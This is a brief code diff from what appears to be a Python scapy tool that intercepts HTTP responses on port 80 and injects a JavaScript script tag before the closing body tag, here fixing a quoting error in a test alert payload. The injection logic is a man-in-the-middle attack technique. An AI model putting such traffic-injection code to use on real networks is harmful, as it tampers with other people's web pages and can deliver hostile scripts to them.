@@ -28,7 +28,7 @@ def process_packet(packet):
 
             elif scapy_packet[scapy.TCP].sport == 80:
                 print('[+] Response')
-                injection_code = '<script>alert(\'test\);</script>'
+                injection_code = '<script>alert(\'test\');</script>'
                 #Replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
                 load = load.replace('</body>', injection_code + '</body>')
                 # matches string Content-Length <some number>, extracting only the number
